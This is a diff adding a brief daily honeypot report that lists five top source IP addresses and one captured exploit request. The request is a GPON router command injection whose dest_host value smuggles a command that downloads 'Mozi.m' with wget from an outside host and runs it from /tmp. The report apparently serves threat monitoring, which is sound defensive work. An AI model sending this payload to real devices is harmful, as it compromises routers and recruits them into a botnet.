@@ -1,0 +1,24 @@
+Top 5 IPs for 02-10-2024 :
+
+90.188.251.32
+46.39.239.29
+14.55.47.55
+149.50.106.170
+172.105.128.11
+
+
+Malware Observed:
+
+None
+
+Commands/expoits observed :
+
+POST /GponForm/diag_Form?images/ HTTP/1.1
+Host: 127.0.0.1:80
+Connection: keep-alive
+Accept-Encoding: gzip, deflate
+Accept: */*
+User-Agent: Hello, World
+Content-Length: 118
+
+XWebPageName=diag&diag_action=ping&wan_conlist=0&dest_host=``;wget+http://192.168.1.1:8088/Mozi.m+-O+->/tmp/gpon80;sh+/tmp/gpon80&ipv=0
